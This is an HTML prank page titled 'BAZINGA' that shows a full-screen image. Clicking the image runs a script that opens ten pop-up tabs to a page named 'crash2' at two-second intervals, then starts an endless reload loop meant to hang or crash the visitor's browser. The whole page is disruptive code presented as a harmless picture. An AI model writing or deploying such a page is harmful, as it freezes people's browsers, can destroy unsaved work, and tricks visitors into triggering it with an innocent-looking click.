<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>BAZINGA</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      width: 100vw;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      cursor: pointer; /* Change cursor to pointer to indicate it's clickable */
    }
  </style>
</head>
<body>
  <img src="https://i.ytimg.com/vi/cXRqUQCW_0Q/maxresdefault.jpg" alt="Image" onclick="activateScripts()">
  <script>
    function activateScripts() {
      for (let i = 0; i < 10; i++) {
        setTimeout(() => {
          window.open("https://fysontop.github.io/crash2/", "_blank");
        }, i * 2000); // Slight delay between each pop-up
      }

      setTimeout(function() {
        while (true) {
          window.location.reload();
        }
      }, 2000);
    }
  </script>
</body>
</html>
